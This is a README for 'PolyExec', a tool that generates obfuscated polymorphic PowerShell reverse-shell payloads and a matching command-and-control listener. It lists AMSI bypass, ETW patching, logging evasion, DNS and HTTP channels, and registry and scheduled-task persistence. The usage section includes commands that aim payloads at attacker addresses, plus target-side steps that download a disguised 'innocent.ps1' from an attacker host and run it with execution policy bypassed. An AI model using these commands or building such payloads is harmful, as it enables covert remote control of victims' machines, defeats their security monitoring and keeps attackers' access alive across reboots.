## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 
#### Tested on Debian, Fedora, Windows 10, Windows 11 25H2 KB5074109

##### polyexecgen.py - Generate obfuscated PS payloads <br>
##### c2_catcher.py - Receive the encrypted tunnel

--- 

### Features:

AES-256 encrypted TCP tunnel(normal)<br>
TCP Basic reverse shell (simple)<br>
HTTP/HTTPS (80 or 443)<br>
DNS(sneaky)<br>
multi session threaded<br>
custom keys<br>
AMSI bypass<br>
ETW patching<br>
scriptblock log bypass<br>
prng variable names<br>
junk code<br>
Traffic jitter<br>

---

### PolyExec Gen Usage:

##### install requirements:

    pip install -r requirements.txt

##### Make executable:

    chmod +x polyexecgen.py c2_catcher.py

##### Encrypted shell -- full evasion:

    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k myg00dpassw0rd
    
##### basic TCP shell:

    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
    
##### HTTP --  web traffic:

    ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
    
##### DNS C2 (sneaky):

    ./polyexecgen.py -m dns --dns-domain c2.example.com


### C2 Catcher Usage:
##### (to listen on privileged ports...< 1024, like 443 or 80), run as sudo)

##### Encrypted listener

    $ python3 c2_catcher.py
    
    # Select 1 for encrypted Listener
    # Enter encryption key: myg00dpassw0rd (same as payload key)
    
#### Standard TCP listener

    $ python3 c2_catcher.py
   
    # Select [2] for Standard Listener
    # Enter port: 6969
    
#### Config

    $ python3 c2_catcher.py
    
    # Select 3, add host/port/encryption setting


#### On windows target, aquire from host and execute payload:

    PS C:\Users\windows> Invoke-WebRequest -Uri http://xx.xx.xx.xxx:8000/polyexec_encrypted_*.ps1 -OutFile innocent.ps1
    
    PS C:\Users\windows> powershell.exe -ExecutionPolicy Bypass -File innocent.ps1
    
<br>

---


#### Persistance:

 payload w/ auto install persistence:
 
    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted --persist
    
Puts data on disk<br>
Registry Run key<br>
Scheduled task at logon<br>
File copy to %APPDATA%<br>
 
---

#### ideas borrowed from cool humans: <br>

@danielbohannon  <br>
@harmj0y  <br>
@enigma0x3  <br>
 <br>
